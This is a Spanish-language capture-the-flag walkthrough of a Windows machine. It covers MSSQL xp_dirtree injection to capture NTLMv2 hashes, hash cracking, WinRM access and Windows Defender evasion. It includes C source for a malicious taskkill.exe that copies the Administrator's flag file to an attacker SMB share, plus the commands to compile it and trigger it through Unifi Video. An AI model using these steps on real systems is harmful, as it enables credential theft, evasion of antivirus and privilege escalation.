## Tecnicas utilizadas
- SQL Injection (XP_DIRTREE) [SQLI] - Get Net-NTLMv2 Hash  
- Windows Defender Evasion (Ebowla)  
- Windows Defender Evasion (Building our own C program)  
- Service Listing Techniques  
- Abusing Unifi-Video (Privilege Escalation)
## Procedimiento
- Fuzzing
- MSSQL injection, apoyandonos del material de StackOverflow[https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server] para ejecutar la funciona XP_DirTree y cargar un archivo a nivel de sistema de mi maquina compartido por SMB. Al hacerlo, recibimos un hash Net-NTLMv2 que podemos romper por fuerza bruta de manera offline con **John The Ripper**
- Al romper la contraseña, intentamos conectarnos al servicio de WinRM con la herramienta **Evil-WinRM**, si el usuario al cual acabamos de robar su contraseña esta dentro del grupo *Remote Management Users* podremos entrar sin problema.
- En la carpeta *Documents* del usuario actual, encontramos un binario que corresponde a un programo instalado a nivel de sistema; *Unifi Video*. Si buscamos por este en SearchSploit podemos ver que existe una forma de escalar privilegios.
- Para escalar privilegios tenemos que seguir los siguientes pasos
	1. Crear un binario malicioso que se llame *Taskkill.exe*. Esto, por que en el archivo encontrado en SE explica que cuando se inicia y se detiene el servicio, trata de correr un archivo con dicho nombre que se encuentra en la carpeta por defecto de *UniFi video*.
	2. Intentando ejecutar el binario, nos percatamos que el Windows defender lo desactiva, asi que descartamos esta posibilidad.
- Utilizamos mingw-w64. Creamos un script en C de la siguiente manera 
```c++
#include <stdlib.h>

int main(){
	system("type C:\\Users\\Administrator\\Desktop\\root.txt > \\\\<ip-host>\\smbFolder\\root.txt");
}
```
- Compilamos el script de la siguiente manera ``x86_64-w64-mingw32-gcc $script -o taskkill.exe`` 
- Compartimos el binario a la maquina victima, y solo tendriamos que parar y arrancar el servicio para que este se ejecute.
- Tenemos muchas formas de listar servicios, pero utilizaremos la de HKLM con el articulo que nos ofrece Microsoft. ``cd HKLM:\SYSTEM\CurrentControlSet\Service``
- Una vez tenemos el nombre del servicio, lo detenemos de la siguiente manera ``cmd /c sc stop <service-name>``